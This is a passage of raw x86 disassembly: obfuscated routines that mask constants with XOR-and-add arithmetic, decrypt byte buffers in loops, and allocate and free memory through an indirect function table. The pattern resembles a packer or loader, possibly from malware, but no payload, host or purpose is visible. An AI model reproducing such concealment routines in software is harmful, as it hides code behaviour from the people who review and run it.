  424e74:	mov    DWORD PTR [ebp-0x30],edi
  424e77:	mov    eax,DWORD PTR [ebp-0x34]
  424e7a:	xor    eax,ebx
  424e7c:	add    eax,esi
  424e7e:	mov    DWORD PTR [ebp-0xc],eax
  424e81:	mov    eax,DWORD PTR [ebp-0x34]
  424e84:	xor    eax,ebx
  424e86:	add    eax,esi
  424e88:	mov    DWORD PTR [ebp-0x8],eax
  424e8b:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  424e92:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  424e99:	mov    eax,DWORD PTR [ebp-0x34]
  424e9c:	mov    ecx,DWORD PTR [ebp-0x28]
  424e9f:	xor    eax,ebx
  424ea1:	add    eax,esi
  424ea3:	cmp    ecx,eax
  424ea5:	je     0x4250a4
  424eab:	jmp    0x425080
  424eb0:	mov    ecx,DWORD PTR [ebp-0xc]
  424eb3:	mov    eax,DWORD PTR [ebp-0x28]
  424eb6:	sub    eax,ecx
  424eb8:	mov    ecx,DWORD PTR [ebp-0x44]
  424ebb:	xor    ecx,ebx
  424ebd:	add    ecx,esi
  424ebf:	xor    edx,edx
  424ec1:	div    ecx
  424ec3:	mov    DWORD PTR [ebp-0x8],eax
  424ec6:	mov    eax,DWORD PTR [ebp-0x4c]
  424ec9:	mov    ecx,DWORD PTR [ebp-0x8]
  424ecc:	xor    eax,ebx
  424ece:	add    eax,esi
  424ed0:	cmp    ecx,eax
  424ed2:	jbe    0x424ede
  424ed4:	mov    eax,DWORD PTR [ebp-0x4c]
  424ed7:	xor    eax,ebx
  424ed9:	add    eax,esi
  424edb:	mov    DWORD PTR [ebp-0x8],eax
  424ede:	mov    eax,DWORD PTR [ebp-0x44]
  424ee1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ee4:	xor    eax,ebx
  424ee6:	add    eax,esi
  424ee8:	imul   eax,ecx
  424eeb:	mov    DWORD PTR [ebp-0x8],eax
  424eee:	mov    eax,DWORD PTR [ebp-0x34]
  424ef1:	mov    ecx,DWORD PTR [ebp-0x8]
  424ef4:	xor    eax,ebx
  424ef6:	add    eax,esi
  424ef8:	cmp    ecx,eax
  424efa:	je     0x42506e
  424f00:	mov    eax,DWORD PTR [ebp-0x8]
  424f03:	mov    DWORD PTR [ebp-0x14],eax
  424f06:	mov    eax,DWORD PTR [ebp-0xc]
  424f09:	add    eax,DWORD PTR [ebp-0xd4]
  424f0f:	mov    DWORD PTR [ebp-0x24],0xf89c85a5
  424f16:	mov    DWORD PTR [ebp-0x20],edi
  424f19:	mov    DWORD PTR [ebp-0xe8],0xf89c85a3
  424f23:	mov    DWORD PTR [ebp-0x8],eax
  424f26:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  424f2d:	mov    DWORD PTR [ebp-0x1c],edi
  424f30:	mov    eax,DWORD PTR [ebp-0x24]
  424f33:	xor    eax,ebx
  424f35:	add    eax,esi
  424f37:	jmp    0x42502d
  424f3c:	mov    DWORD PTR [ebp-0xe0],0xf89c85ba
  424f46:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  424f50:	mov    eax,DWORD PTR [ebp-0x1c]
  424f53:	mov    ecx,DWORD PTR [ebp-0x48]
  424f56:	xor    eax,ebx
  424f58:	add    eax,esi
  424f5a:	imul   eax,ecx
  424f5d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f60:	mov    al,BYTE PTR [eax+ecx*1]
  424f63:	mov    BYTE PTR [ebp-0x2],al
  424f66:	mov    eax,DWORD PTR [ebp-0x1c]
  424f69:	mov    ecx,DWORD PTR [ebp-0x48]
  424f6c:	xor    eax,ebx
  424f6e:	add    eax,esi
  424f70:	imul   eax,ecx
  424f73:	mov    ecx,DWORD PTR [ebp-0xe8]
  424f79:	xor    ecx,ebx
  424f7b:	add    eax,ecx
  424f7d:	mov    ecx,DWORD PTR [ebp-0x8]
  424f80:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424f88:	mov    ecx,DWORD PTR [ebp-0xe0]
  424f8e:	xor    ecx,ebx
  424f90:	lea    eax,[ecx+eax*1+0x3272f6]
  424f97:	movzx  ecx,BYTE PTR [ebp-0x2]
  424f9b:	xor    ecx,eax
  424f9d:	mov    BYTE PTR [ebp-0x2],cl
  424fa0:	mov    al,BYTE PTR [ebp-0x2]
  424fa3:	mov    ecx,DWORD PTR [ebp-0x1c]
  424fa6:	mov    edx,DWORD PTR [ebp-0x48]
  424fa9:	xor    ecx,ebx
  424fab:	add    ecx,esi
  424fad:	imul   ecx,edx
  424fb0:	mov    edx,DWORD PTR [ebp-0x8]
  424fb3:	mov    BYTE PTR [ecx+edx*1],al
  424fb6:	mov    eax,DWORD PTR [ebp-0x1c]
  424fb9:	mov    ecx,DWORD PTR [ebp-0x48]
  424fbc:	xor    eax,ebx
  424fbe:	add    eax,esi
  424fc0:	imul   eax,ecx
  424fc3:	mov    ecx,DWORD PTR [ebp-0x8]
  424fc6:	mov    al,BYTE PTR [eax+ecx*1]
  424fc9:	mov    BYTE PTR [ebp-0x2],al
  424fcc:	mov    eax,DWORD PTR [ebp-0x1c]
  424fcf:	mov    ecx,DWORD PTR [ebp-0x48]
  424fd2:	xor    eax,ebx
  424fd4:	add    eax,esi
  424fd6:	imul   eax,ecx
  424fd9:	mov    ecx,DWORD PTR [ebp-0x20]
  424fdc:	xor    ecx,ebx
  424fde:	add    eax,ecx
  424fe0:	mov    ecx,DWORD PTR [ebp-0x8]
  424fe3:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  424feb:	mov    ecx,DWORD PTR [ebp-0xc4]
  424ff1:	xor    ecx,ebx
  424ff3:	lea    eax,[ecx+eax*1+0x3272f6]
  424ffa:	movzx  ecx,BYTE PTR [ebp-0x2]
  424ffe:	xor    ecx,eax
  425000:	mov    BYTE PTR [ebp-0x2],cl
  425003:	mov    al,BYTE PTR [ebp-0x2]
  425006:	mov    ecx,DWORD PTR [ebp-0x1c]
  425009:	mov    edx,DWORD PTR [ebp-0x48]
  42500c:	xor    ecx,ebx
  42500e:	add    ecx,esi
  425010:	imul   ecx,edx
  425013:	mov    edx,DWORD PTR [ebp-0x8]
  425016:	mov    BYTE PTR [ecx+edx*1],al
  425019:	mov    eax,DWORD PTR [ebp-0x38]
  42501c:	mov    ecx,DWORD PTR [ebp-0x20]
  42501f:	xor    eax,ebx
  425021:	xor    ecx,ebx
  425023:	add    eax,esi
  425025:	add    ecx,esi
  425027:	imul   eax,ecx
  42502a:	add    eax,DWORD PTR [ebp-0x48]
  42502d:	mov    DWORD PTR [ebp-0x48],eax
  425030:	mov    eax,DWORD PTR [ebp-0x48]
  425033:	mov    ecx,DWORD PTR [ebp-0x14]
  425036:	cmp    ecx,eax
  425038:	jb     0x424f3c
  42503e:	mov    eax,DWORD PTR [ebp-0x20]
  425041:	mov    ecx,DWORD PTR [ebp-0x14]
  425044:	xor    eax,ebx
  425046:	add    eax,esi
  425048:	imul   eax,ecx
  42504b:	mov    ecx,DWORD PTR [ebp-0x24]
  42504e:	xor    ecx,ebx
  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
